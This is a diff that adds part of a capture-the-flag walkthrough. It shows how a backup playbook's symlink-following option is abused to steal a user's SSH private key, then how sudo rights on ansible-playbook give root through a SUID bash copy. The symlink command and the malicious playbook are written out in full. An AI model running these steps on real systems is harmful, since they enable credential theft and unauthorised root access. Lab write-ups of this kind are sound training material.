@@ -265,6 +265,91 @@ Let's take a look at playbook that runs every minute.
 It is copying files from webroot to /opt/backups/files:  
 +  /var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes  
 
+It can be abused because of copy_links option.  
+This option will follow symlinks when it runs.  
+
+We can't write to:  
++  /var/lib/tomcat9/webapps/ROOT/admin/dashboard
+
+But we can write to:  
++  /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads  
+
+We can create symlink that will exfiltrate luis's ssh key:  
+```
+ln -s /home/luis/.ssh/id_rsa  /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads
+```
+Now we wait for it to be archived to /opt/backups/archives.  
+We'll copy it to /dev/shm to prevent it from being deleted.  
+```
+cp  backup-2025-06-30-07:33:33.gz  /dev/shm
+```
+Now we need to unzip this file to view contents:  
+
+![obraz](https://github.com/user-attachments/assets/05a797df-5c41-48d9-b484-c165daa43882)
+
+Check what file is it after unziping with gunzip:  
+
+![obraz](https://github.com/user-attachments/assets/5ebd1f53-72fd-45cf-8a92-f18011e1291e)
+
+We changed it's name so it will be easier to work with:  
+
+![obraz](https://github.com/user-attachments/assets/358403a3-085f-40ae-83a8-af5dc5bb6f7f)
+
+Now we can copy this ssh key to our kali machine and connect via ssh:  
+
+![obraz](https://github.com/user-attachments/assets/4ccffbaf-5bcc-4f77-beb8-ab583afbedc7)
+
+We can retrieve a flag now:  
+
+![obraz](https://github.com/user-attachments/assets/2eb20412-b307-4d1c-8246-01ab576b6049)
+
+
+
+
+## Priv esc to root  
+
+Privilege escalation to root was quite simple on this machine.  
+As part of my usual enumeration process, I ran sudo -l to check for any allowed commands:  
+
+![obraz](https://github.com/user-attachments/assets/c5a991b4-298b-449d-ac66-f785a6e2dc26)
+
+We can run ansible-playbook as root.  
+All we have to do now is create malicious playbook and run it with sudo.  
+Playbook I wrote was:
+```
+- name: Copy file and set permissions
+  hosts: localhost
+  become: yes
+  tasks:
+    - name: Copy /bin/bash to /tmp/bash
+      copy:
+        src: /bin/bash
+        dest: /tmp/bash
+        mode: '0755'
+        remote_src: yes
+
+    - name: Set SUID bit on /tmp/bash
+      file:
+        path: /tmp/bash
+        mode: '4755'
+```
+It will copy /bin/bash to /tmp/bash and set SUID bit.  
+
+![obraz](https://github.com/user-attachments/assets/cddeb596-5cb5-4f03-a114-104c5caf9193)
+
+Now we can run our copy of /bin/bash with -p flag to get root shell:  
+
+![obraz](https://github.com/user-attachments/assets/5e669ac2-99f0-43ed-b085-ba9b0bfdbda4)
+
+Thank you for reading!!  
+
+
+
+
+
+
+
+
 
 
 
